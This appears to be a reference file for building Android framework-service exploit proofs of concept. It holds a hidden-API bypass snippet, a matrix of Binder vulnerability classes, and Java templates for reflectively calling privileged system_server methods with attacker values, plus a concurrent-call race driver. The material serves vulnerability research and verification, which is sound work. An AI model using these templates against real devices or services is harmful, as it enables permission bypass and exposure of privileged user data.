---
name: poc-framework-service
description: Framework-service PoC reference covering clearCallingIdentity misuse, missing permission enforcement, identity confusion, intent redirect, data exposure, and race conditions.
---

# Framework Service PoC Reference

Use this reference for Binder calls into `system_server` or another privileged framework process. Framework-service PoCs almost always fit the `binder-caller` shape.

## Contents

- [Template Wiring](#template-wiring)
- [Hidden API Rule](#hidden-api-rule)
- [Construction Matrix](#construction-matrix)
- [Pattern 1 - Parameterized Binder Caller](#pattern-1---parameterized-binder-caller)
- [Pattern 2 - Concurrency Driver](#pattern-2---concurrency-driver)
- [Construction Notes](#construction-notes)

## Template Wiring

These snippets show the Binder execution body shape. In the current template:

- keep hidden-API and Binder setup inside a helper method
- register one exploit id in `ExploitRegistry`
- keep one generic Binder helper and call it with target-specific parameters
- use hidden API access only for framework paths

## Hidden API Rule

Framework-service PoCs usually need hidden API access for `ServiceManager` and related Binder plumbing.

```java
import org.lsposed.hiddenapibypass.HiddenApiBypass;

HiddenApiBypass.addHiddenApiExemptions("");
```

Do not mix hidden-API setup into ordinary app-component PoCs.

## Construction Matrix

| Vulnerability | PoC shape | Typical support | Visible success |
|---------------|--------------|-----------------|-----------------|
| `clearCallingIdentity()` misuse | `binder-caller` | hidden API access | privileged work runs after attacker-triggered call |
| missing permission enforcement | `binder-caller` | hidden API access | privileged Binder method succeeds without required permission |
| identity confusion | `binder-caller` | hidden API access | attacker can act for another user or caller identity |
| intent redirect | `binder-caller` | hidden API access | privileged service forwards attacker-controlled Intent |
| data exposure | `binder-caller` | hidden API access | privileged data is returned |
| race condition | `binder-caller` | hidden API access plus concurrency helper | repeated concurrent calls trigger inconsistent state |

## Pattern 1 - Parameterized Binder Caller

Use for permission-missing, identity-confusion, intent-redirect, and data-leak cases.

```java
private static void runApiTest(
    String serviceName,
    String interfaceDescriptor,
    String methodName,
    Class<?>[] paramTypes,
    Object[] params
) {
    try {
        HiddenApiBypass.addHiddenApiExemptions("");
        Class<?> smClass = Class.forName("android.os.ServiceManager");
        Method getService = HiddenApiBypass.getDeclaredMethod(smClass, "getService", String.class);
        IBinder serviceBinder = (IBinder) getService.invoke(null, serviceName);

        Method asInterface = HiddenApiBypass.getDeclaredMethod(
            Class.forName(interfaceDescriptor + "$Stub"),
            "asInterface",
            IBinder.class);

        Object service = asInterface.invoke(null, serviceBinder);
        Method targetMethod = HiddenApiBypass.getDeclaredMethod(
            Class.forName(interfaceDescriptor + "$Stub$Proxy"),
            methodName,
            paramTypes);

        Object result = targetMethod.invoke(service, params);

        Log.i("PoC", "Binder call result: " + String.valueOf(result));
    } catch (Exception e) {
        Log.e("PoC", "Framework Binder setup failed", e);
    }
}
```

Registration shape:

```java
static {
    register("framework-api-test", "Call Framework API", () -> {
        runApiTest(
            "vulnerable_service",
            "android.os.IVulnerableService",
            "sensitiveMethod",
            new Class<?>[]{String.class, int.class},
            new Object[]{"attacker-value", 0}
        );
    });
}
```

Fill with:

- real framework service name
- real interface descriptor such as `android.os.IPowerManager`
- one verified vulnerable method only
- exact parameter types in declaration order
- exact argument values needed to prove the path

Success signal:

- actual returned privileged data
- actual privileged state change
- actual privileged component launch
- actual framework error that proves the call crossed the permission boundary

## Pattern 2 - Concurrency Driver

Use for race-condition findings.

```java
private static void runFrameworkRace(
    String serviceName,
    String interfaceDescriptor,
    String methodName,
    Class<?>[] paramTypes,
    Object[] params
) {
    int threadCount = 10;
    ExecutorService executor = Executors.newFixedThreadPool(threadCount);
    CountDownLatch latch = new CountDownLatch(threadCount);

    for (int i = 0; i < threadCount; i++) {
        executor.submit(() -> {
            try {
                runApiTest(serviceName, interfaceDescriptor, methodName, paramTypes, params);
            } finally {
                latch.countDown();
            }
        });
    }
}
```

Use when:

- the verified finding depends on a timing window
- the same privileged call must be replayed quickly under identical parameters

Do not use the concurrency driver for ordinary single-call authorization bugs.

## Construction Notes

- framework-service PoCs may still require special device state, root, or privileged test conditions
- keep the exploit focused on one verified service name, one interface descriptor, and one method
- prefer a parameterized helper like `runApiTest(...)` over writing one-off Binder plumbing for every finding
- if the service uses parcelables, callbacks, or hidden framework classes that are not yet reconstructed, do not overclaim `build-ready`
